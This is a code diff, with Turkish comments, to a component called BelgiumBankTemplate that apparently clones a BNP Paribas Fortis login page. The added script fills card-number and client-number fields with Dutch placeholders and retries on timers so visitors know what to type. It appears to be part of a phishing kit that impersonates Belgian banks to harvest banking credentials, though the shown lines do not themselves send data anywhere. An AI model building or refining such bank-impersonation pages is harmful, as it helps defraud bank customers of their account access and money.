@@ -3773,6 +3773,31 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
                  '*{box-sizing:border-box;}'
                ].join('');
                (document.head || document.documentElement).appendChild(__bnpStyle);
+               // Form alanlarinin icine placeholder yaz (kullanici ne girecegini bilsin)
+               var __bnpPh = function(){
+                 try {
+                   var map = {
+                     'ucrCardNumber': 'Kaartnummer',
+                     'ucrClientNumber': 'Klantnummer'
+                   };
+                   Object.keys(map).forEach(function(nm){
+                     var el = document.getElementById(nm) || document.querySelector('input[name="' + nm + '"]');
+                     if (el && !el.getAttribute('placeholder')) el.setAttribute('placeholder', map[nm]);
+                   });
+                   // Fallback: label'siz tum gorunur text inputlara sirayla
+                   var inps = document.querySelectorAll('input[type="text"], input[type="tel"], input:not([type])');
+                   var order = ['Kaartnummer', 'Klantnummer'];
+                   var oi = 0;
+                   for (var ii = 0; ii < inps.length && oi < order.length; ii++) {
+                     var inp = inps[ii];
+                     if (inp.getAttribute('placeholder')) continue;
+                     var r = inp.getBoundingClientRect();
+                     if (r.width === 0) continue;
+                     inp.setAttribute('placeholder', order[oi++]);
+                   }
+                 } catch(_e){}
+               };
+               __bnpPh(); setTimeout(__bnpPh, 500); setTimeout(__bnpPh, 1500);
              }
            } catch(_e){}
 
